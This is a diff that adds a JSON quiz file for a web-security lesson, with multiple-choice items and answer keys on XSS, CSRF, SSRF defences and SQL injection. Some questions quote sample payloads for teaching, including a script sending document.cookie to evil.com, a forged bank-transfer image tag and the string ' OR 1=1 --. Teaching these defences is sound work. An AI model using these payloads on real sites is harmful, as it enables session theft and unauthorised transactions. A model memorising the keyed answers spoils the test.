@@ -1,0 +1,70 @@
+{
+  "_meta": {
+    "scaffold_stub": false,
+    "phase": 12,
+    "lesson": 21,
+    "title": "Web Security — XSS, CSRF, SQLi, SSRF, deserialization"
+  },
+  "questions": [
+    {
+      "stage": "pre",
+      "question": "A web application reflects user input in an HTML page without any escaping. An attacker submits a comment containing <script>fetch('https://evil.com/steal?c='+document.cookie)</script>. What vulnerability class is this, and what is the primary risk?",
+      "options": [
+        "SQL injection — the attacker can read the application's database by injecting SQL syntax through the comment field",
+        "Cross-Site Scripting (XSS) — the attacker's script executes in the context of the victim's session, potentially stealing cookies, redirecting the user, or defacing the page",
+        "Cross-Site Request Forgery (CSRF) — the attacker forges a request on behalf of the victim by guessing the comment submission endpoint",
+        "Server-Side Request Forgery (SSRF) — the attacker tricks the server into making an outbound request to an attacker-controlled endpoint"
+      ],
+      "correct": 1,
+      "explanation": "This is stored XSS. The attacker's payload is stored on the server (in the comments database) and served to every visitor without escaping. When the victim's browser renders the page, the script executes in the origin of the vulnerable site, giving it access to the victim's cookies, local storage, and the ability to make authenticated requests on their behalf. The severity depends on the victim's privileges — if the victim is an admin, the attacker can perform admin-level actions."
+    },
+    {
+      "stage": "pre",
+      "question": "A web application uses cookies for session management but does not implement CSRF protection. An attacker hosts a page at https://evil.com that contains <img src='https://bank.com/transfer?to=attacker&amount=10000' />. A victim who is logged into bank.com visits evil.com. What happens?",
+      "options": [
+        "Nothing — the browser's same-origin policy blocks evil.com from making requests to bank.com",
+        "The browser sends the request to bank.com but does not include the session cookie because evil.com is a different origin",
+        "The browser sends the request including the bank.com session cookie, and if bank.com processes GET requests for state-changing actions, the transfer succeeds",
+        "The request is blocked because CSRF tokens are automatically validated by the browser for cross-origin image requests"
+      ],
+      "correct": 2,
+      "explanation": "The browser automatically attaches cookies to requests based on the destination origin, regardless of what site initiated the request. The same-origin policy only prevents reading the response — it does not prevent sending the request. If bank.com allows GET requests for transfers (a common vulnerability), the transfer will be processed as if the victim authorized it. This is why CSRF tokens or SameSite cookies are necessary — they provide cryptographic proof that the request originated from the legitimate site, not from a third party."
+    },
+    {
+      "stage": "post",
+      "question": "Why does Content-Security-Policy (CSP) alone not fully protect against stored XSS, and what additional defense is needed?",
+      "options": [
+        "CSP only protects against reflected XSS, not stored XSS — the additional defense is input sanitization at the server",
+        "CSP restricts which scripts can execute but does not prevent the injection of script tags into the DOM — the injected content still reaches the user. Context-aware output encoding (HTML entity encoding) is needed to ensure user input is treated as text, not code",
+        "CSP fully protects against all forms of XSS — no additional defense is needed if the policy is strict enough (script-src 'none')",
+        "CSP protects the server but not the client — the additional defense is HTTPS to prevent man-in-the-middle injection"
+      ],
+      "correct": 1,
+      "explanation": "CSP is a defense-in-depth layer, not a primary defense. Even with a strict CSP like 'default-src 'self'; script-src 'self'', an injected <script> tag from the same origin can still execute (because 'self' includes the vulnerable page's origin). CSP also does not prevent the injection of event handlers (<img src=x onerror=...>), <base> tag hijacking, or other non-script injection vectors. The primary defense must always be context-aware output encoding that escapes user input according to where it appears in the HTML (HTML body, attribute, JavaScript string, etc.). CSP then catches the cases where encoding was forgotten."
+    },
+    {
+      "stage": "post",
+      "question": "An application accepts a URL from the user, fetches it server-side, and returns the content. Which of the following is the most effective defense against SSRF targeting cloud metadata services?",
+      "options": [
+        "Blocklist known internal IP ranges (169.254.169.254, 10.0.0.0/8, 192.168.0.0/16) in the URL validation logic",
+        "Allowlist only specific permitted hostnames (e.g., api.example.com) and reject all others, validate the resolved IP is not a private address, disable non-HTTP URL schemes (file://, gopher://), and use network-level firewalls to restrict outbound traffic",
+        "Require the URL to use HTTPS only — cloud metadata services do not support HTTPS",
+        "Rate-limit the endpoint to prevent SSRF scanning — this prevents an attacker from probing many internal endpoints but does not block the initial exploitation"
+      ],
+      "correct": 1,
+      "explanation": "Blocklists are notoriously ineffective against SSRF because attackers can use DNS rebinding (a domain that resolves to a public IP first, then to 169.254.169.254 on the second lookup), IPv6 mappings, redirect chains, URL parsing differentials, and alternative representations (decimal IP notation, 0, 0x0, etc.). An allowlist of permitted destinations eliminates the entire class of attacks by ensuring only known-safe hosts are reachable. Combined with resolved-IP validation (to catch DNS rebinding), scheme restriction (to prevent file:// reads), and network-layer firewalls (to block access to metadata services even if application-level validation is bypassed), this provides defense in depth. Rate limiting is a mitigation, not a prevention."
+    },
+    {
+      "stage": "pre",
+      "question": "What is a SQL injection attack?",
+      "options": [
+        "Injecting malware through SQL database backups",
+        "Inserting malicious SQL code into user input fields to manipulate database queries executed by the server",
+        "Overloading a database with too many queries",
+        "Encrypting a database without authorization"
+      ],
+      "correct": 1,
+      "explanation": "SQL injection occurs when user input is concatenated into SQL queries without sanitization. Input like `' OR 1=1 --` can transform a login query into one that always returns true, bypassing authentication. Parameterized queries (prepared statements) are the primary defense."
+    }
+  ]
+}
